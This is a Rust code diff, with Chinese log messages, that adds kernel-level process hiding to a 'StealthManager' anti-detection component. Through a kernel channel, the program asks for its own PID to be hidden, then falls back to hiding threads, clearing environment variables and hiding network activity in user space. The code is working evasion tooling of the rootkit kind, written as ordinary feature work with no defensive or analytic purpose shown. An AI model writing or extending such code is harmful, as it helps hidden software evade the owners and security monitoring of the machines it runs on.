@@ -19,6 +19,8 @@ use crate::anti_detect::thread_hide::ThreadHider;
 use crate::anti_detect::env_clean::EnvCleaner;
 #[cfg(unix)]
 use crate::anti_detect::net_hide::NetHider;
+#[cfg(any(target_os = "linux", target_os = "android"))]
+use crate::communication::kernel_channel::KernelChannel;
 use crate::Result;
 
 // ======================== 隐蔽模式状态 ========================
@@ -81,6 +83,10 @@ pub struct StealthManager {
     env_cleaner: Option<EnvCleaner>,
     #[cfg(unix)]
     net_hider: Option<NetHider>,
+    #[cfg(any(target_os = "linux", target_os = "android"))]
+    kernel_channel: Option<KernelChannel>,
+    #[cfg(any(target_os = "linux", target_os = "android"))]
+    kernel_available: bool,
     loaded: bool,
 }
 
@@ -104,6 +110,10 @@ impl StealthManager {
             env_cleaner: None,
             #[cfg(unix)]
             net_hider: None,
+            #[cfg(any(target_os = "linux", target_os = "android"))]
+            kernel_channel: None,
+            #[cfg(any(target_os = "linux", target_os = "android"))]
+            kernel_available: true,
             loaded: false,
         }
     }
@@ -112,6 +122,38 @@ impl StealthManager {
     pub fn set_mode(&mut self, mode: StealthMode) {
         self.mode = mode;
         log::info!("隐蔽模式已设置为: {:?}", mode);
+    }
+
+    #[cfg(any(target_os = "linux", target_os = "android"))]
+    fn ensure_kernel_channel(&mut self) -> Option<&KernelChannel> {
+        if !self.kernel_available {
+            return None;
+        }
+
+        if self.kernel_channel.is_none() {
+            match KernelChannel::new() {
+                Ok(channel) => {
+                    match channel.ping() {
+                        Ok(_) => {
+                            log::info!("内核通道已连接，优先使用内核级进程隐藏");
+                            self.kernel_channel = Some(channel);
+                        }
+                        Err(e) => {
+                            log::warn!("内核通道不可用，回退到用户态隐藏: {}", e);
+                            self.kernel_available = false;
+                            return None;
+                        }
+                    }
+                }
+                Err(e) => {
+                    log::warn!("创建内核通道失败，回退到用户态隐藏: {}", e);
+                    self.kernel_available = false;
+                    return None;
+                }
+            }
+        }
+
+        self.kernel_channel.as_ref()
     }
 
     /// 按需加载反检测模块
@@ -166,6 +208,22 @@ impl StealthManager {
     /// 依次调用已加载模块的隐藏功能。
     pub fn apply_all(&mut self) -> Result<()> {
         self.load_on_demand()?;
+
+        // 0. 优先尝试内核级进程隐藏（最高优先级）
+        #[cfg(any(target_os = "linux", target_os = "android"))]
+        {
+            let current_pid = unsafe { libc::getpid() };
+            if let Some(channel) = self.ensure_kernel_channel() {
+                match channel.hide_process(current_pid) {
+                    Ok(()) => {
+                        log::info!("内核级进程隐藏成功: PID={}", current_pid);
+                    }
+                    Err(e) => {
+                        log::warn!("内核级进程隐藏失败，继续用户态隐藏: {}", e);
+                    }
+                }
+            }
+        }
 
         // 1. 清除环境变量（最先执行）
         #[cfg(unix)]
